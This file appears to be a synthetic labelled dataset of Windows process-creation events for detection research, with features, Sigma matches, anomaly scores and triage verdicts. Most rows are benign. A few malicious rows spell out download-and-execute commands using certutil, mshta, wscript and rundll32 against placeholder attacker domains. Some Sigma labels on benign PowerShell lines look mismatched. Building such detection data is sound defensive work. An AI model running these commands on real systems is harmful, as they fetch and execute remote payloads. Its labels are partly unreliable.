UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label,parent_process_name,child_process_name,is_known_lolbin,is_scripting_engine,command_line_length,command_line_entropy,has_suspicious_flag,contains_url,contains_ip_address,has_base64_pattern,argument_count,suspicious_argument_ratio,has_encoded_command,has_download_indicator,process_ancestry_depth,parent_is_office_app,parent_is_browser,parent_is_script_engine,chain_hash,hour_of_day,is_off_hours,is_weekend,minute_of_hour,parent_child_pair_rarity,command_length_zscore,entropy_zscore,is_system_user,user_encoded,integrity_encoded,sigma_match,sigma_rule_name,sigma_level,sigma_mitre_tags,ml_anomaly_score,chain_risk_score,chain_description,chain_matched_pattern,final_verdict,priority,confidence,explanation
2024-07-02T14:02:05.426Z,{46D24F55-2614-4A9A-B1EC-93EDD8A01E67},58459,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter {OperatingSystem -like '*Server*'} -Properties OperatingSystem, LastLogonDate | Select Name, OperatingSystem, LastLogonDate | Export-Csv C:\Reports\servers.csv""",C:\Windows\System32\cmd.exe,cmd.exe,47162,CORP\admin,High,0,,,gray_area,1,3,1,1,239,4.8519,0,0,0,0,20,0.0,0,0,2,0,0,1,4082297620,14,0,0,2,1.3846,8.11103402869963,1.525908482748314,0,3,2,False,None,none,,94.18199478912264,0,cmd.exe → powershell.exe: No known suspicious pattern,False,ALERT,MEDIUM,66.1,"ANOMALY SCORE: 94/100 | Unusual factors: unusually long command line: 239.00 (baseline: 36.70±24.93, z=8.1); command length significantly above baseline: 8.11 (baseline: -0.00±1.00, z=8.1); unusual number of arguments: 20.00 (baseline: 3.17±2.29, z=7.3); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-01T10:59:54.322Z,{4C00906F-8F84-4C6F-B143-6535E3C0B130},2026,C:\Windows\System32\cmd.exe,cmd.exe /c net use Z: \\fileserver\share,C:\Windows\explorer.exe,C:\Windows\explorer.exe,64010,CORP\netadmin,Medium,0,,,benign,0,4,1,1,40,4.0251,0,0,0,0,6,0.0,0,0,1,0,0,0,2764436884,10,0,0,59,0.9208,0.13231049082901014,0.28788591636119604,0,8,1,False,None,none,,34.05317502870089,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,11.4,
2024-07-03T14:44:57.683Z,{149C2E6C-EA8D-42BA-B400-DE3B079FCE9B},51454,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -f http://apt-infra9284.org/svc713.exe C:\Users\Public\helper260.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,51470,CORP\jsmith,Medium,1,T1105,Certutil Download,malicious,4,8,1,0,91,4.8118,1,1,0,0,5,0.2,0,1,2,0,0,1,2657444117,14,0,0,44,3.9031,2.1771089854591685,1.4658640888052525,0,9,1,True,Certutil URL Cache Download,high,attack.t1105,88.64467524103503,85,"powershell.exe → certutil.exe: PowerShell invoking certutil [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,98.9,Sigma rule matched: Certutil URL Cache Download | ML Score: 89 | Chain Risk: 85
2024-07-04T05:22:13.930Z,{0181030D-8352-46D7-BD3E-12FDD3984977},13265,C:\Windows\System32\UsoClient.exe,UsoClient.exe StartInteractiveScan,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,19021,NT AUTHORITY\SYSTEM,System,0,,,benign,2,9,0,0,34,3.8895,0,0,0,0,2,0.0,0,0,1,0,0,0,392754572,5,1,0,22,1.7891,-0.1082540379510085,0.08484302811483231,1,2,3,False,None,none,,26.086914239292923,10,svchost.exe → usoclient.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,8.7,
2024-07-05T04:33:49.404Z,{0449BB49-31ED-4084-BB26-3F7387300745},58148,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name W3SVC -Force""",C:\Windows\System32\cmd.exe,cmd.exe,18281,CORP\sysadmin,High,0,,,gray_area,1,3,1,1,71,4.5466,1,0,0,0,7,0.1429,0,0,2,0,0,1,4082297620,4,1,0,33,1.3846,1.3752272228591065,1.0687625109074974,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,75.60924877652835,15,"cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +10 off-hours, +5 suspicious flags]",False,ALERT,CRITICAL,97.6,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 76 | Chain Risk: 15
2024-07-04T13:38:16.026Z,{C82F54FD-B669-4020-ADB9-AB790B9BD610},6985,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",16002,CORP\netadmin,Medium,0,,,benign,0,10,0,0,11,2.6635,0,0,0,0,1,0.0,0,0,1,0,0,0,1342727496,13,0,0,38,2.1249,-1.03041806494108,-1.7509282181244123,0,8,1,False,None,none,,16.385190937620152,0,explorer.exe → firefox.exe: No known suspicious pattern,False,CLEAR,NONE,5.5,
2024-07-04T16:09:10.188Z,{BD211D0B-C35F-4808-9279-2237DFA01983},15469,C:\Windows\System32\perfmon.exe,perfmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,41428,CORP\admin,High,0,,,benign,0,11,0,0,11,3.0272,0,0,0,0,1,0.0,0,0,1,0,0,0,1935590950,16,0,0,9,2.0,-1.03041806494108,-1.2063360466258695,0,3,2,False,None,none,,10.830562145979538,0,explorer.exe → perfmon.exe: No known suspicious pattern,False,CLEAR,NONE,3.6,
2024-07-05T10:07:48.459Z,{7DA4DF89-CAEC-4C1B-A6E1-852F47F5F977},12329,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Installers\app_setup_9.9.86.msi /quiet,C:\Windows\explorer.exe,C:\Windows\explorer.exe,63197,CORP\itops,High,0,,,benign,0,12,0,0,56,4.3873,0,0,0,0,4,0.0,0,0,1,0,0,0,2082361945,10,0,0,7,1.4881,0.7738159009090598,0.8302320382109952,0,5,2,False,None,none,,10.564655353312475,0,explorer.exe → msiexec.exe: No known suspicious pattern,False,CLEAR,NONE,3.5,
2024-07-05T17:58:30.893Z,{0BF65EBD-1939-40F0-A138-8E2B730FA895},56599,C:\Windows\System32\cmd.exe,cmd.exe /c hostname,C:\Windows\explorer.exe,C:\Windows\explorer.exe,49223,CORP\analyst02,Medium,0,,,benign,0,4,1,1,19,3.6819,0,0,0,0,3,0.0,0,0,1,0,0,0,2764436884,17,0,0,58,0.9208,-0.7096653599010552,-0.22601024327119282,0,11,1,False,None,none,,33.873550420570375,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,11.3,
2024-07-03T16:37:06.462Z,{EB4AE2FF-902D-4541-ABC3-0ED31305F210},34019,C:\Windows\explorer.exe,explorer.exe C:\Users\agarwal\Documents,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",15519,CORP\agarwal,Medium,0,,,benign,0,0,0,0,39,4.163,0,0,0,0,2,0.0,0,0,1,0,0,0,1994286725,16,0,0,37,1.7891,0.09221640269900704,0.49437274740229886,0,12,1,False,None,none,,7.446782135011073,0,explorer.exe → explorer.exe: No known suspicious pattern,False,CLEAR,NONE,2.5,
2024-07-02T08:33:51.433Z,{ABD9EBE7-AF91-49BE-91F5-02BC4CC55AB3},32347,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --type=renderer --field-trial-handle=12345,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",62581,CORP\netadmin,Low,0,,,benign,5,13,0,0,53,4.2344,0,0,0,0,3,0.0,0,0,2,0,1,0,3035334175,8,0,0,33,1.727,0.6535336365190505,0.6012847106824633,0,8,0,False,None,none,,41.7313394900136,0,chrome.exe → chrome.exe: No known suspicious pattern,False,CLEAR,NONE,13.9,
2024-07-02T08:12:01.737Z,{28356EA9-0D1D-43F1-BE0F-48A2FB52FA69},39859,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://phish-host6401.net/script646.hta"""""")",C:\Windows\System32\cmd.exe,cmd.exe,16629,CORP\klee,Medium,1,T1218.005,Mshta Remote HTA,malicious,1,5,1,1,105,4.7091,0,1,0,0,3,0.0,0,0,2,0,0,1,345041238,8,0,0,12,3.9031,2.738426219279212,1.3120845561879855,0,6,1,True,Mshta Remote HTA Execution,high,attack.t1218.005,74.4333351381524,75,cmd.exe → mshta.exe: Command shell invoking mshta [Modifiers: +15 URL in command],True,ALERT,CRITICAL,97.4,Sigma rule matched: Mshta Remote HTA Execution | ML Score: 74 | Chain Risk: 75
2024-07-03T11:38:12.465Z,{2299A957-9106-4FA8-8B79-9BBEEDFD9597},61929,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe https://sharepoint.corp.local/sites/team,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",27473,CORP\analyst01,Medium,0,,,benign,6,13,0,0,51,3.993,0,1,0,0,2,0.0,0,0,2,1,0,0,2101233099,11,0,0,38,1.9488,0.5733454602590443,0.23982045387809633,0,13,1,False,None,none,,59.54880311248457,15,outlook.exe → chrome.exe: No known suspicious pattern [Modifiers: +15 URL in command],False,CLEAR,NONE,19.8,
2024-07-04T10:59:47.985Z,{38B84E84-C521-41BF-89C1-D6C555787F82},58166,C:\Windows\System32\cmd.exe,cmd.exe /c ping 8.8.8.8,C:\Windows\explorer.exe,C:\Windows\explorer.exe,61688,CORP\analyst02,Medium,0,,,benign,0,4,1,1,23,3.4473,0,0,1,0,4,0.0,0,0,1,0,0,0,2764436884,10,0,0,59,0.9208,-0.5492890073810427,-0.577292408334592,0,11,1,False,None,none,,74.13575972575076,0,explorer.exe → cmd.exe: No known suspicious pattern,False,ALERT,MEDIUM,52.8,"ANOMALY SCORE: 74/100 | Unusual factors: IP address in command line: 1.00 (baseline: 0.01±0.11, z=8.9)"
2024-07-04T13:55:02.714Z,{E87F4640-6815-48B5-A195-79FE769C16B3},35722,C:\Program Files\Microsoft OneDrive\OneDrive.exe,OneDrive.exe /sync,C:\Program Files\Microsoft Office\root\Office16\POWERPNT.EXE,"""C:\Program Files\Microsoft Office\root\Office16\POWERPNT.EXE""",29112,CORP\dbadmin,Medium,0,,,benign,7,14,0,0,18,3.6144,0,0,0,0,2,0.0,0,0,2,1,0,0,3106230957,13,0,0,55,2.058,-0.7497594480310582,-0.3270824774646265,0,4,1,False,None,none,,36.41729840355211,0,powerpnt.exe → onedrive.exe: No known suspicious pattern,False,CLEAR,NONE,12.1,
2024-07-04T15:32:23.056Z,{1D72DC8B-0BCE-4C2D-B886-4472CDBC6336},33742,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Set-ExecutionPolicy RemoteSigned -Scope CurrentUser""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,57319,CORP\mjones,Medium,0,,,benign,0,3,1,1,88,4.5334,1,0,0,0,7,0.1429,0,0,1,0,0,0,945137867,15,0,0,32,1.231,2.0568267210691595,1.0489972739985602,0,0,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.55366357151834,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.2,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 42 | Chain Risk: 5
2024-07-05T11:48:30.514Z,{8660642F-EB80-43F7-997A-BFC7CD225924},59776,C:\Windows\System32\schtasks.exe,"schtasks.exe /create /tn ""NightlyBackup"" /tr ""C:\Scripts\backup.bat"" /sc daily /st 02:00",C:\Windows\System32\cmd.exe,cmd.exe,2223,CORP\itops,High,0,,,gray_area,1,15,0,0,88,4.568,0,0,0,0,10,0.0,0,0,2,0,0,1,200102300,11,0,0,48,3.9031,2.0568267210691595,1.1008061525628967,0,5,2,False,None,none,,71.90718888062081,0,cmd.exe → schtasks.exe: No known suspicious pattern,False,ALERT,MEDIUM,51.3,"ANOMALY SCORE: 72/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); unusual number of arguments: 10.00 (baseline: 3.17±2.29, z=3.0); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3); unusually long command line: 88.00 (baseline: 36.70±24.93, z=2.1)"
2024-07-02T16:19:21.501Z,{DA1801AC-3794-4D85-B814-DCC7D2C4C177},26781,C:\Program Files\Git\bin\git.exe,git.exe status,C:\Windows\System32\cmd.exe,cmd.exe,49784,CORP\jsmith,Medium,0,,,benign,1,16,0,0,14,3.182,0,0,0,0,2,0.0,0,0,2,0,0,1,771288345,16,0,0,19,2.0,-0.9101358005510707,-0.9745437228755965,0,9,1,False,None,none,,49.74538627339963,0,cmd.exe → git.exe: No known suspicious pattern,False,CLEAR,NONE,16.6,
2024-07-05T12:16:05.408Z,{CDF1C781-D09F-43D9-B6E1-EF987B248400},33887,C:\Windows\System32\csrss.exe,csrss.exe ObjectDirectory=\Windows,C:\Windows\System32\smss.exe,smss.exe,29474,NT AUTHORITY\SYSTEM,System,0,,,benign,8,17,0,0,34,4.1607,0,0,0,0,2,0.0,0,0,1,0,0,0,1831210085,12,0,0,16,2.9031,-0.1082540379510085,0.4909288046075597,1,2,3,False,None,none,,42.30390338238166,0,smss.exe → csrss.exe: No known suspicious pattern,False,CLEAR,NONE,14.1,
2024-07-05T16:19:58.355Z,{7A44C08D-979C-4F1E-91D2-F3A960F5D51B},32565,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,msedge.exe --type=gpu-process,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",36367,CORP\analyst02,Low,0,,,benign,9,18,0,0,29,3.7623,0,0,0,0,2,0.0,0,0,2,0,1,0,2603814309,16,0,0,19,1.9031,-0.30872447860102403,-0.10562198209857021,0,11,0,False,None,none,,43.11495615505984,0,msedge.exe → msedge.exe: No known suspicious pattern,False,CLEAR,NONE,14.4,
2024-07-03T13:45:48.424Z,{9CF64C98-65C3-4D34-87F8-C82D38CFF6F5},24635,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s C:\Program Files\Microsoft Office\root\Office16\GROOVEEX.DLL,C:\Windows\System32\cmd.exe,cmd.exe /c,42251,CORP\admin,High,0,,,gray_area,1,19,1,0,76,4.7663,0,0,0,0,5,0.0,0,0,2,0,0,1,2398546659,13,0,0,45,3.9031,1.575697663509122,1.3977339161267168,0,3,2,False,None,none,,72.5951068836082,55,cmd.exe → regsvr32.exe: Command shell invoking regsvr32,True,ALERT,MEDIUM,51.7,"ANOMALY SCORE: 73/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-02T16:02:53.378Z,{3C16BDF8-4429-4DB4-8091-5B2F8E89E279},39175,C:\Program Files\Slack\Slack.exe,Slack.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",37210,CORP\jsmith,Medium,0,,,benign,0,20,0,0,9,2.9477,0,0,0,0,1,0.0,0,0,1,0,0,0,1108469835,16,0,0,2,1.699,-1.1106062412010862,-1.3253766780092462,0,9,1,False,None,none,,11.96397010007483,0,explorer.exe → slack.exe: No known suspicious pattern,False,CLEAR,NONE,4.0,
2024-07-02T12:35:24.316Z,{17ABD12C-39CC-4316-87F7-DC1D19E05415},42874,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://shadow-net355.com/script679.js,C:\Windows\System32\cmd.exe,cmd.exe /c,63815,CORP\jsmith,Medium,1,T1059.005,WScript Remote Script,malicious,1,21,1,1,61,4.439,1,1,0,0,3,0.3333,0,0,2,0,0,1,4144717783,12,0,0,35,3.9031,0.9742863415590755,0.907645882771003,0,9,1,True,WScript or CScript Remote Script Execution,high,attack.t1059.005,91.26008575428897,75,"cmd.exe → wscript.exe: Command shell invoking WScript [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,99.1,Sigma rule matched: WScript or CScript Remote Script Execution | ML Score: 91 | Chain Risk: 75
2024-07-04T08:55:53.613Z,{544897EB-5E1A-4BA5-BDB8-98F49F1D1E7A},60930,C:\Windows\System32\conhost.exe,conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,57397,NT AUTHORITY\SYSTEM,System,0,,,benign,2,22,0,0,31,3.6797,0,0,0,0,3,0.0,0,0,1,0,0,0,26065344,8,0,0,55,1.8617,-0.22853630234101782,-0.2293044494226828,1,2,3,False,None,none,,11.397010800482398,0,svchost.exe → conhost.exe: No known suspicious pattern,False,CLEAR,NONE,3.8,
2024-07-01T13:45:12.280Z,{B6F246EA-4A6A-4128-A3C9-8F801CCA463E},25140,C:\Users\admin\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,54969,CORP\admin,High,0,,,benign,0,23,0,0,18,3.5305,0,0,0,0,3,0.0,0,0,1,0,0,0,2635501913,13,0,0,45,1.6726,-0.7497594480310582,-0.4527115211509824,0,3,2,False,None,none,,2.8072093168774335,0,explorer.exe → setup.exe: No known suspicious pattern,False,CLEAR,NONE,0.9,
2024-07-04T15:05:54.651Z,{A735845D-7950-4171-AB5C-C2ED40854AA3},33796,C:\Windows\System32\certutil.exe,certutil.exe -hashfile C:\Downloads\patch.msi SHA1,C:\Windows\System32\cmd.exe,cmd.exe,14333,CORP\itops,High,0,,,gray_area,1,8,1,0,50,4.6582,0,0,0,0,4,0.0,0,1,2,0,0,1,1473216238,15,0,0,5,3.9031,0.5332513721290413,1.2358686047739738,0,5,2,False,None,none,,66.88435332266556,50,cmd.exe → certutil.exe: Command shell invoking certutil,True,CLEAR,NONE,22.3,
2024-07-01T11:57:56.468Z,{83A2B14B-29F9-4461-9FD5-25B2EE357C33},6721,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";eval(""window.close"")",C:\Windows\System32\cmd.exe,explorer.exe,6254,CORP\mjones,Medium,1,T1218.011,Rundll32 JavaScript,malicious,1,1,1,0,77,4.9254,1,0,0,0,3,0.3333,0,0,2,0,0,1,606078729,11,0,0,57,3.9031,1.6157917516391251,1.6359649155367193,0,0,1,True,Rundll32 JavaScript Execution,critical,attack.t1218.011,94.86174491210221,55,cmd.exe → rundll32.exe: Command shell invoking rundll32 [Modifiers: +5 suspicious flags],True,ALERT,CRITICAL,99.5,Sigma rule matched: Rundll32 JavaScript Execution | ML Score: 95 | Chain Risk: 55
2024-07-04T11:29:52.800Z,{CC848CEC-7674-4577-882B-E47976688289},13489,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Installers\app_setup_4.3.15.msi /quiet,C:\Windows\explorer.exe,C:\Windows\explorer.exe,47975,CORP\sysadmin,High,0,,,benign,0,12,0,0,56,4.423,0,0,0,0,4,0.0,0,0,1,0,0,0,2082361945,11,0,0,29,1.4881,0.7738159009090598,0.883688019851078,0,10,2,False,None,none,,10.352412458900297,0,explorer.exe → msiexec.exe: No known suspicious pattern,False,CLEAR,NONE,3.5,
